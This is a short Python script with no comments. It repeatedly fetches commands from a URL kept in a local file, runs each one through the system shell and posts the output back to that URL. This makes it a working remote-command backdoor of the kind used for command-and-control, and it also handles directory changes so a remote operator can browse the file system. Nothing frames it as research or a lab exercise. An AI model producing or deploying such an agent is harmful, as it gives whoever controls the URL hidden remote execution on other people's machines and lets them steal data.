import subprocess as sp
import requests
import time
import os

with open("tele_link.txt", "r") as f:
    tele_link = f.read().strip()


def clear():
    if os.name=="nt":
        os.system("cls")
    else:
        os.system("clear")

s=requests.Session()


def is_connected(test_link = "https://www.google.com"):
    for _ in range(1):
        try:
            res = s.get(test_link)
            if not ((res.ok) and (len(res.text)>1200)):
                return([False, False])
        except:
            return([False, False])
    for _ in range(1):
        try:
            if not (s.get(tele_link).ok):
                return([True, False])
        except:
            return([True, False])
    return([True, True])

def send(payload):
    data = {'return_text': payload}
    try:
        s.post(tele_link, data=data)
    except:
        pass

clear()

def convert(code):
    lis = []
    is_inside = False
    text = ""
    for i in code.replace("'", '"'):
        if (i=='"'):
            is_inside = not is_inside
        if (i==" ") and (not is_inside):
            lis.append(text)
            text = ""
        elif not (i=='"'):
            text += i
    lis.append(text)
    return(lis)


while True:
    try:
        id, code = s.get(tele_link).text.split("%üğş")
        if code == "":
            continue
        if not code == "":
            if (len(convert(code))==2) and (convert(code)[0] == "cd"):
                if os.path.exists(convert(code)[1]):
                    os.chdir(convert(code)[1])
            print("asked :"+str(convert(code)))
            res = sp.Popen(convert(code), shell=True, stdout=sp.PIPE).communicate()[0].decode()
            send(id+"%üğş"+str(res))
            print("returned :"+res)
    except:
        time.sleep(1)
    time.sleep(0.1)